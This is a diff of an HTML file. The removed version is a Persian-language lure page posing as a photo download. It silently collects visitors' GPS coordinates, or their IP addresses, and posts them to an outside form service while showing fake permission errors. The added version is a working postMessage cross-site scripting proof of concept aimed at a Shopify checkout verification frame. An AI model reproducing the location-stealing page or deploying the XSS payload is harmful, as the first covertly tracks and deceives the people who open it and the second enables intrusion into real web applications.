@@ -1,151 +1,27 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <style>
-        body { font-family: Tahoma; direction: rtl; text-align: center; padding: 20px; background: #111; color: #eee; }
-        #status { margin-top: 30px; font-size: 18px; }
-    </style>
+    <title>XSS via postMessage</title>
 </head>
 <body>
-    <h2>در حال دریافت عکس....</h2>
-    <div id="status"></div>
-
+    <iframe id="victim" src="https://checkout.us.shopifycs.com/verification_value?identifier=4a94b55cf88c409b43b2cc6b16ec1869&dir=ltr"></iframe>
     <script>
-   
-        const FORM_ENDPOINT = 'https://formspree.io/f/mpqevqkd'; 
-   
+        var iframe = document.getElementById('victim');
 
-        const statusEl = document.getElementById('status');
-
-        function updateStatus(text, isError = false) {
-            statusEl.textContent = text;
-            if (isError) statusEl.style.color = '#f66';
-            else statusEl.style.color = '#6f6';
-        }
-
-        
-        async function sendToServer(payload) {
-            try {
-                const response = await fetch(FORM_ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                if (response.ok) {
-                    updateStatus(`خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.`);
-                } else {
-                    updateStatus(`خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.`,true);
+        iframe.onload = function() {
+         
+            var payload = {
+                action: "load_fonts",
+                fonts: {
+                    google: ["\"><img src=x onerror=alert('XSS via postMessage: ' + document.domain)>"]
                 }
-            } catch (err) {
-                updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', true);
-            }
-        }
-
-    
-        async function sendGPS(lat, lng, accuracy) {
-            await sendToServer({
-                lat: lat,
-                lng: lng,
-                accuracy: accuracy,
-                method: 'gps',
-                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
-            });
-        }
-
-        
-        async function sendIPs(ipList) {
-            await sendToServer({
-                ips: ipList,
-                method: 'ip',
-                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
-            });
-        }
-
-        
-        async function getMultipleIPs() {
-          
-            const services = [
-                { url: 'https://checkip.amazonaws.com', extract: (text) => text.trim() },
-                { url: 'https://api.ip.sb/geoip', extract: (data) => data.ip }, 
-            ];
-
-            
-            const fetchWithTimeout = (url, timeout = 3000) => {
-                const controller = new AbortController();
-                const timer = setTimeout(() => controller.abort(), timeout);
-                return fetch(url, { signal: controller.signal })
-                    .finally(() => clearTimeout(timer));
             };
 
-           
-            const promises = services.map(async (svc) => {
-                try {
-                    const resp = await fetchWithTimeout(svc.url);
-                    if (!resp.ok) return null;
-                    const contentType = resp.headers.get('content-type') || '';
-                    let body;
-                    if (contentType.includes('application/json')) {
-                        body = await resp.json();
-                    } else {
-                        body = await resp.text();
-                    }
-                    return svc.extract(body);
-                } catch (e) {
-                    return null;
-                }
-            });
+            
+            var msg = 'cardfields:' + JSON.stringify(payload);
 
-            const results = await Promise.allSettled(promises);
-            const ips = new Set(); 
-
-            results.forEach((result) => {
-                if (result.status === 'fulfilled' && result.value && typeof result.value === 'string') {
-                    const ip = result.value.trim();
-                    if (ip.length > 0) ips.add(ip);
-                }
-            });
-
-            return Array.from(ips);
-        }
-
-        
-        function tryGPS() {
-            updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.');
-
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    sendGPS(
-                        pos.coords.latitude,
-                        pos.coords.longitude,
-                        `دقت ${Math.round(pos.coords.accuracy)} متر`
-                    );
-                },
-                async (err) => {
-                    console.warn('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', err.message);
-                    updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.');
-                    try {
-                        const ipList = await getMultipleIPs();
-                        if (ipList.length > 0) {
-                            await sendIPs(ipList);
-                        } else {
-                            updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', true);
-                        }
-                    } catch (ex) {
-                        updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', true);
-                    }
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }
-
-        tryGPS();
+            iframe.contentWindow.postMessage(msg, '*');
+        };
     </script>
 </body>
 </html>
